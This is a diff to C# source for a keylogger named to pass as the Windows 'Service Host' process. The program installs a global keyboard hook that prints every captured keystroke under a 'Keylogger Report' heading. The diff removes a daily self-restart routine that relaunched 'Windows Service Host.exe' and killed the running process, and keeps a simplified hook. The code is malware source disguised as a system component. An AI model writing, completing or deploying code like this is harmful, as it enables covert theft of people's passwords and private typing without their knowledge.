@@ -80,7 +80,6 @@ namespace Windows_Service_Host
         {
             using (var api = new KeystrokeAPI())
             {
-                int i = 0;
                 int year = DateTime.Now.Year;
                 int month_raw = DateTime.Now.Month;
                 string month = getMonth(month_raw);
@@ -88,25 +87,7 @@ namespace Windows_Service_Host
                 Console.Write("Keylogger Report for ");
                 Console.WriteLine(day + " " + month + " " + year);
                 
-                //api.CreateKeyboardHook((character) => {Console.Write(character);});
-                api.CreateKeyboardHook((character) => {
-                    int currentSecond = DateTime.Now.Second;
-                    if (DateTime.Now.Day != day || DateTime.Now.Month != month_raw || DateTime.Now.Year != year)
-                    {
-                        try
-                        {
-                            Process.Start(Application.StartupPath + "\\Windows Service Host.exe");
-                            Process.GetCurrentProcess().Kill();
-                        }
-                        catch
-                        { }
-                    }
-                    Console.Write(character);
-                    if (DateTime.Now.Minute == 5 && i == 0)
-                    {
-                        Console.WriteLine("yes");
-                        i++;
-                    }; });
+                api.CreateKeyboardHook((character) => {Console.Write(character);});
                 Application.Run();
             }
         }
